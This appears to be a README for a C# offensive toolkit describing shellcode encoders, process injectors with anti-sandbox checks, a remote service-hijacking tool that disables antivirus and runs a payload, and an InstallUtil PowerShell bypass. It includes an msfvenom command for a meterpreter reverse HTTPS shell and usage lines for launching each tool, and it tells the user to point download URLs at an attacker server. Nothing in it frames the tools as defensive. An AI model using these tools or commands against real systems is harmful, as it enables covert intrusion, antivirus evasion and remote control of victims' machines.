# C# Tools

Shellcode injection, encoding, and AV evasion utilities. Compile with Visual Studio or `dotnet build`.

## Projects

### Helper

Encodes raw msfvenom shellcode with a Caesar cipher (+5 offset) and outputs it in C# hex format. Used to generate encrypted payloads for `ConsoleAppChallenge` and `LatInject`.

```
# Generate shellcode, then run Helper to encode it
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
# Paste raw bytes into Helper/Program.cs, compile and run
```

### HelperVBA

Same as Helper but outputs in VBA-compatible decimal format with a +2 Caesar offset. Used for Office macro payloads.

### ConsoleAppChallenge

Shellcode injector with sandbox evasion. Decrypts Caesar-encoded shellcode at runtime and injects it into a target process using `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread`.

**Anti-sandbox checks:**
- `FlsAlloc` — detects emulated environments
- `VirtualAllocExNuma` — fails in basic sandboxes
- `Sleep` timing check — detects fast-forwarded execution

```
ConsoleAppChallenge.exe
```

### LatInject

Injects Caesar-encrypted shellcode into the Print Spooler process (`spoolsv.exe`). Includes a `VirtualAllocExNuma` sandbox check. Designed to be deployed and executed by `lat2`.

```
LatInject.exe
```

### lat2

Remotely modifies a Windows service via the Service Control Manager (`OpenSCManager`) to:

1. Change the service binary path to remove AV signatures
2. Start the service (disables AV)
3. Change the service binary path to a payload executable
4. Start the service again (executes payload)

Update the `target`, `ServiceName`, and `payload` variables in `Program.cs` before compiling.

```
lat2.exe
```

### POSHBypass

Executes PowerShell commands via .NET's `System.Management.Automation` runspace. The payload lives in the `Uninstall()` method of an Installer class, so it is triggered via `InstallUtil`:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U POSHBypass.exe
```

Update the download URLs in `Program.cs` to point to your attacker server.
